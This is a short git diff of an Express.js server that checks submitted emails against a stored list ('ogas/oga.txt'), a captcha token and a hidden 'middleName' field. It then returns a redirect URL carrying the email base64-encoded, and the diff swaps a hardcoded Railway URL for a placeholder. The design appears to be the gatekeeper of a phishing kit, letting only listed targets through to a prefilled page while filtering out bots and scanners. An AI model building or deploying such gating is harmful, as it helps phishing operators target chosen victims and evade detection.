@@ -10,7 +10,9 @@ const rateLimit = require('express-rate-limit');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
-const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://zezbomf65a64504e.up.railway.app/#';
+
+// ✅ The base for redirect links (points to the frontend)
+const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://your-frontend.up.railway.app/#';
 
 let validEmails = new Set();
 function loadEmails() {
@@ -34,7 +36,6 @@ app.use(cors());
 app.use(express.json());
 app.use(limiter);
 
-// ✅ Email verification API
 app.post('/api/check-email', async (req, res) => {
   const { email, captchaToken, middleName } = req.body;
 
@@ -70,6 +71,7 @@ app.post('/api/check-email', async (req, res) => {
     return res.status(404).json({ valid: false, message: 'Email not recognized' });
   }
 
+  // ✅ Encode and send redirect URL
   const encoded = Buffer.from(normalizedEmail).toString('base64');
   const redirectUrl = `${REDIRECT_BASE}${encoded}`;
   return res.json({ valid: true, redirectUrl });
